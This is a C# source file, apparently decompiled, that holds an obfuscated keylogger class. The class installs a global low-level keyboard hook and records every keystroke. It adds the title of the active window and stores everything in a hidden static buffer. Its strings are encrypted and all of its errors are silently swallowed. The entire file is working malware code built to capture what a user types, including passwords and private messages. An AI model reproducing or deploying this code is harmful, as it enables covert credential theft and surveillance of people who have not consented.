using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class VPXNIVH
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref VOSEHB lParam);

	public struct VOSEHB
	{
		public int UTTILO;

		public int UOFFJO;

		public int JNLOCO;

		public int FYXYVK;

		public int UYHFRB;
	}

	private string output;

	private static IntPtr OKCLRMK = (IntPtr)0;

	private static string XYPNPD = "";

	private static KeyboardHookDelegate OPHNUVD = null;

	public static string LHTWUF(IntPtr hWnd)
	{
		string result = default(string);
		try
		{
			if (hWnd.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(hWnd);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)hWnd, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool DBEKFY()
	{
		bool result = default(bool);
		try
		{
			result = OKCLRMK != (IntPtr)0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void HFJBSVH()
	{
		try
		{
			OPHNUVD = KYBRDLCK;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			OKCLRMK = (IntPtr)SetWindowsHookExA(13, OPHNUVD, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void FHBELO()
	{
		try
		{
			if (DBEKFY() && UnhookWindowsHookEx((int)OKCLRMK) != 0)
			{
				OKCLRMK = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	public static int KYBRDLCK(int Code, int WPA, ref VOSEHB LPA)
	{
		try
		{
			string text = LHTWUF(GetForegroundWindow());
			if (Operators.CompareString(text, XYPNPD, false) != 0)
			{
				XYPNPD = text;
				NTUIYURW.KSQKXQN = NTUIYURW.KSQKXQN + Environment.NewLine + GOSLWHR.WHJBIYT("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + " " + text + " " + GOSLWHR.WHJBIYT("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			Thread.Sleep(10);
			string text2 = "";
			if (WPA == 256 || WPA == 260)
			{
				checked
				{
					switch (LPA.UTTILO)
					{
					case 8:
						NTUIYURW.KSQKXQN = NTUIYURW.KSQKXQN.Substring(0, NTUIYURW.KSQKXQN.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 18:
						text2 = GOSLWHR.WHJBIYT("W7Gi1M6Ydg0=", "False");
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? GOSLWHR.WHJBIYT("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : GOSLWHR.WHJBIYT("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = GOSLWHR.WHJBIYT("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = GOSLWHR.WHJBIYT("RyA=", "False");
						break;
					case 33:
						text2 = GOSLWHR.WHJBIYT("Zbu708uqtdvPhAE=", "False");
						break;
					case 34:
						text2 = GOSLWHR.WHJBIYT("VKqqwrqZk8nYwZFvFA==", "False");
						break;
					case 35:
						text2 = GOSLWHR.WHJBIYT("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = GOSLWHR.WHJBIYT("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = GOSLWHR.WHJBIYT("U6mVvXIT", "False");
						break;
					case 38:
						text2 = GOSLWHR.WHJBIYT("SJ6ssmce", "False");
						break;
					case 39:
						text2 = GOSLWHR.WHJBIYT("X7WjyX4H", "False");
						break;
					case 40:
						text2 = GOSLWHR.WHJBIYT("O5GXpVor", "False");
						break;
					case 46:
						text2 = GOSLWHR.WHJBIYT("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = GOSLWHR.WHJBIYT("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(GOSLWHR.WHJBIYT("VBM=", "False")) });
							switch (LPA.UTTILO)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(LPA.UTTILO);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(LPA.UTTILO + 32).ToLower() : char.ConvertFromUtf32(LPA.UTTILO + 32).ToUpper());
						break;
					case 91:
					case 92:
						text2 = GOSLWHR.WHJBIYT("Q5mgubBls73EsZGbaSY=", "False");
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = GOSLWHR.WHJBIYT("UaedGA==", "False") + Conversions.ToString(LPA.UTTILO - 111) + GOSLWHR.WHJBIYT("o4EC", "False");
						break;
					case 144:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_NumLock()) ? GOSLWHR.WHJBIYT("ZLq45tCQzs3cg5PNx5EG", "False") : GOSLWHR.WHJBIYT("SZ+dy7V1s7LBaHiqtbNoHQ==", "False"));
						break;
					case 16:
					case 160:
					case 161:
						text2 = "";
						break;
					case 162:
					case 163:
						text2 = GOSLWHR.WHJBIYT("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = GOSLWHR.WHJBIYT("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("cBI=", "False") : GOSLWHR.WHJBIYT("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("WSs=", "False") : GOSLWHR.WHJBIYT("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("YhE=", "False") : GOSLWHR.WHJBIYT("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("cAQ=", "False") : GOSLWHR.WHJBIYT("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("ZRA=", "False") : GOSLWHR.WHJBIYT("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("aQ0=", "False") : GOSLWHR.WHJBIYT("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("lBM=", "False") : GOSLWHR.WHJBIYT("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(LPA.UTTILO);
						break;
					case 219:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("mgg=", "False") : GOSLWHR.WHJBIYT("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("czA=", "False") : GOSLWHR.WHJBIYT("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("gSM=", "False") : GOSLWHR.WHJBIYT("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? GOSLWHR.WHJBIYT("bQE=", "False") : GOSLWHR.WHJBIYT("Ths=", "False"));
						break;
					}
					NTUIYURW.KSQKXQN += text2;
					NTUIYURW.JOJFO = NTUIYURW.KSQKXQN;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, StringBuilder lpString, int cch);

	public VPXNIVH(string output)
	{
		try
		{
			this.output = output;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
